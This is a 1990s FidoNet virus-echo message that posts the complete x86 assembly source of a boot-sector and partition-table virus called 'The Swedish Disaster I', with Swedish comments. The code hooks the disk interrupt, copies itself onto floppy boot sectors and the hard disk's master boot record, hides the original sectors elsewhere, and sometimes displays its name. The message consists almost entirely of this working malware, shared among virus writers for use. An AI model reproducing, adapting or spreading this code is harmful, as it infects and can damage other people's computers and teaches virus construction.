;Ä PVT.VIRII (2:465/65.4) ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ PVT.VIRII Ä
; Msg  : 11 of 54
; From : MeteO                               2:5030/136      Tue 09 Nov 93 09:11
; To   : -  *.*  -                                           Fri 11 Nov 94 08:10
; Subj : SWEDISH.ASM
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;.RealName: Max Ivanov
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;* Kicked-up by MeteO (2:5030/136)
;* Area : VIRUS (Int: ˆ­ä®p¬ æ¨ï ® ¢¨pãá å)
;* From : Daniel Hendry, 2:283/718 (06 Nov 94 16:28)
;* To   : Brad Frazee
;* Subj : SWEDISH.ASM
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;@RFC-Path:
;ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
;18.n283!not-for-mail
;@RFC-Return-Receipt-To: Daniel.Hendry@f718.n283.z2.fidonet.org
;;
; L„gger gamla bootsectorn p† sida 1, sp†r 0, sector 3.
;                             sida 0, sp†r 0, sector 7 p† HD.

Code    Segment
    Assume  cs:Code
    Org 0000h

Main    Proc    Far
    db  0EAh,05h,00h,0C0h,07h

    jmp Near Ptr Init       ; Hoppa f”rbi variabler och nya int13h

; Variabler

Old13h  dd  0           ; Gamla vectorn till diskfunktionerna.
TmpVec  dd  0           ; Tempor„r vec. vid „ndring av int 13.
BootPek dw  0003h,0100h
; Slut p† variabler
Int13h  Proc    Near
        push    ds
    push    ax
    push    bx

    cmp dl,00h          ; Drive A
    jne Exit

    cmp ah,02h
    jb  Exit
    cmp ah,04h
    ja  Exit            ; Kolla s† att func. 2-4

    sub ax,ax
    mov ds,ax
    mov bx,043Fh        ; Motor status byte.
    test    Byte Ptr [bx],01h   ; Testa om motorn i A: „r p†..
    jnz Exit            ; Nej,hoppa till gamla int 13h

    call    Smitta

Exit:   pop bx
    pop ax
    pop ds
    jmp [Old13h]

Smitta  Proc    Near
    push    cx
    push    dx
    push    si
    push    di
    push    es

    push    cs
    pop es
    push    cs
    pop ds

    mov si,0004h        ; Max antal f”rs”k.

Retry:  mov ax,0201h        ; L„s en sector
    mov bx,0200h                ; L„s hit.
    mov cx,0001h        ; Sp†r 0 Sector 1
    sub dx,dx           ; Sida 0 Drive 0
    pushf
    call    [Old13h]        ; L„s in booten.

    jnc OK

    dec si
    jz  Slut            ; Hoppa ur om fel.
    jmp Retry           ; F”rs”k max 4 g†nger.

OK: mov si,0200h
    sub di,di
    cld
    lodsw
    cmp ax,[di]
    jne L2
    lodsw
    cmp ax,[di+2]
    jne L2
    jmp Slut

L2: mov ax,0301h                ; Skriv en sector.
    mov bx,0200h
    mov cx,0003h        ; Sp†r 0 Sector 3
    mov dx,0100h        ; Sida 1 Drive 0
    pushf
    call    [Old13h]        ; Flytta boot sectorn.

    mov ax,0301h
    sub bx,bx
    mov cx,0001h
    sub dx,dx
    pushf
    call    [Old13h]        ; Skriv ner viruset till booten.

Slut:   pop     es
    pop di
    pop si
    pop dx
    pop cx
    ret
Smitta  Endp
Int13h  Endp

Init:   sub ax,ax
    mov ds,ax           ; Nollar ds f”r att „ndra vect.

    cli
    mov ss,ax
    mov sp,7C00h
    sti             ; S„tter upp en ny stack.

    push    cs
    pop es
    mov di,Offset Old13h
    mov si,004Ch
    mov cx,0004h
    cld
    rep movsb           ; Flytta int 13h vectorn.

    mov bx,0413h
    mov ax,[bx]         ; Minnesstorleken till ax.
    dec ax
    dec ax
    mov [bx],ax         ; Reservera plats f”r viruset.

    mov cl,06h
    shl ax,cl
    mov es,ax           ; Omvandla till segment addres.

    mov Word Ptr TmpVec,Offset Int13h
    mov Word Ptr TmpVec+2,es
    push    es
    sub ax,ax
    mov es,ax
    push    cs
    pop ds
    mov si,Offset TmpVec
    mov di,004Ch
    mov cx,0004h
    rep movsb
    pop es

    sub si,si
    mov di,si
    mov cx,0200h        ; Hela viruset + lite till.
    rep movsb

    mov ax,Offset Here
    push    es
    push    ax
    ret             ; Hoppa till viruset.

Here:   sub ax,ax
    int 13h             ; terst„ll driven

    sub ax,ax
    mov es,ax
    mov ax,0201h                ; L„s en sector funk.
    mov bx,7C00h        ; Hit laddas booten normalt.
    mov cx,BootPek
    mov dx,BootPek+2
    int 13h

    push    cs
    pop es
    mov ax,0201h
    mov bx,0200h
    mov cx,0001h
    mov dx,0080h
    int 13h                     ; L„s in partions tabellen.
    jc  Over
    push    cs
    pop ds
    mov si,0200h
    sub di,di
    lodsw
    cmp ax,[di]         ; Kolla om den „r smittad.
    jne HdInf
    lodsw
    cmp ax,[di+2]
    jne HdInf

Over:   mov BootPek,0003h
    mov BootPek+2,0100h
    sub bx,bx
    push    bx
    mov bx,7C00h
    push    bx
    ret             ; K”r den gamla booten.

HdInf:  mov BootPek,0007h
    mov BootPek+2,0080h

    mov ax,0301h
    mov bx,0200h
    mov cx,0007h
    mov dx,0080h
    int 13h         ; Flytta orgin. part.tabellen.
    jc  Over

    push    cs
    pop ds
    push    cs
    pop es
    mov si,03BEh
    mov di,01BEh
    mov cx,0042h
    cld
    rep movsb           ; Kopiera part. data till viruset.

    mov ax,0301h
    sub bx,bx
    mov cx,0001h
    mov dx,0080h
    int 13h         ; Skriv viruset till part. tabellen.


    sub ax,ax
    mov es,ax                   ; Kolla om msg:et ska skrivas ut.
    test    Byte Ptr es:[046Ch],07h
    jnz HdInf1

    mov si,Offset Txt           ; Detta utf”rs bara om man bootar fr†n
    cld                             ; diskett.
Foo1:   lodsb
    cmp al,00h
    je  HdInf1
    mov ah,0Eh
    sub bx,bx
    int 10h
    jmp Foo1

HdInf1: jmp Over

Slutet  Label   Byte            ; Anv„nds f”r att veta var slutet „r.

Txt db  07h,0Ah,0Dh,'The Swedish Disaster I',0Ah,0Dh,00h

Main    Endp
Code    Ends
    End

;-+-  GEcho 1.00
; + Origin: The PRO-Point on a PRO-BBS and a PRO-*.* ...Ciaro?... (2:283/718)
;=============================================================================
;
;Yoo-hooo-oo, -!
;
;
;    ş The MeÂeO
;
;/3            Enable 32-bit processing
;
;--- Aidstest Null: /Kill
; * Origin: ùPVT.ViRIIúmainúboardú / Virus Research labs. (2:5030/136)

